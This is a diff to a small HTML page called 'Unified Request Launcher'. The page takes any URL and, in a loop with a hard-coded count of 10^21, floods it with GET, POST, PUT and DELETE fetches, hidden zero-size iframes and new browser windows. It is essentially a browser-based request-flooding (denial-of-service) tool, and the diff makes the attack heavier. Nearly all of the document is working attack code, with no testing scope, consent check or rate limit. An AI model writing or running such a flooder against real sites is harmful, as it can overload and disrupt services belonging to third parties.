@@ -2,64 +2,51 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Edge Request Launcher</title>
-  <style>
-    body {
-      background: #111;
-      color: #eee;
-      font-family: Consolas, monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    input {
-      width: 400px;
-      padding: 8px;
-      font-size: 14px;
-      margin-bottom: 10px;
-    }
-    button {
-      padding: 8px 16px;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 13px;
-      color: #7cfc00;
-    }
-  </style>
+  <title>Unified Request Launcher</title>
 </head>
 <body>
   <h2>Request a Website</h2>
   <input id="urlInput" type="text" placeholder="Enter full URL (https://...)">
-  <button onclick="sendRequests()">Go</button>
+  <button onclick="sendAll()">Send All</button>
   <div id="status"></div>
 
   <script>
-    // 🔧 Hard-coded knob: change this number directly in the code
-    const REQUEST_COUNT = 1000000000000; // modify this constant to control how many requests are sent
+    // Hard-coded knob: change this number directly in the code
+    const REQUEST_COUNT = 1000000000000000000000; // how many times each type of request is sent
 
-    function sendRequests() {
+    function sendAll() {
       const url = document.getElementById('urlInput').value.trim();
       if (!url) {
         document.getElementById('status').textContent = "Please enter a URL.";
         return;
       }
 
+      let total = REQUEST_COUNT * 6; // GET, POST, PUT, DELETE, iframe, window.open
       let sent = 0;
+
+      function updateStatus() {
+        document.getElementById('status').textContent =
+          `Triggered ${sent}/${total} requests to ${url}`;
+      }
+
       for (let i = 0; i < REQUEST_COUNT; i++) {
-        fetch(url, { mode: 'no-cors' })
-          .then(() => {
-            sent++;
-            document.getElementById('status').textContent =
-              `Sent ${sent}/${REQUEST_COUNT} requests to ${url}`;
-          })
-          .catch(err => {
-            document.getElementById('status').textContent = "Error: " + err;
-          });
+        // HTTP requests
+        fetch(url, { method: 'GET', mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
+        fetch(url, { method: 'POST', body: JSON.stringify({ test: "post" }), headers: { "Content-Type": "application/json" }, mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
+        fetch(url, { method: 'PUT', body: JSON.stringify({ test: "put" }), headers: { "Content-Type": "application/json" }, mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
+        fetch(url, { method: 'DELETE', mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
+
+        // Web requests (visible loads)
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.width = "0";
+        iframe.style.height = "0";
+        iframe.style.border = "none";
+        document.body.appendChild(iframe);
+        sent++; updateStatus();
+
+        window.open(url, "_blank");
+        sent++; updateStatus();
       }
     }
   </script>
